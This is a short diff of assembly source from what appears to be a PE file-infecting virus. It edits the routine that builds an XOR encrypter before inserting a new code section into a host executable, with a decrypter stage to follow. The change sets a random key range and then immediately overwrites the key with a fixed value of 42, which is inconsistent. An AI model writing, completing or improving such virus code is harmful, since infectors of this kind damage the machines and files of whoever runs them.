@@ -464,10 +464,10 @@ mov	[DELTA PeFileMap], eax
 
 
 ; CREATING ENCRYPTER
-; TODO Call rand and use it when copying (xor)
-mov	eax, 128 ; Maximum xoring
+mov	eax, 255 ; Maximum xoring
 call	random
 mov	edx, eax
+mov	edx, 42
 
 ; INSERTING NEW SECTION - OPCODE COPY
 mov	ecx, [DELTA NewSectionCodeSize]
@@ -500,7 +500,7 @@ rol	edx, 8
 mov	dl, dh
 rol	edx, 8
 mov	dl, dh
-xor	eax, edx
+xor	eax, edx ; encrypt
 stosd
 
 ; CREATING DECRYPTER
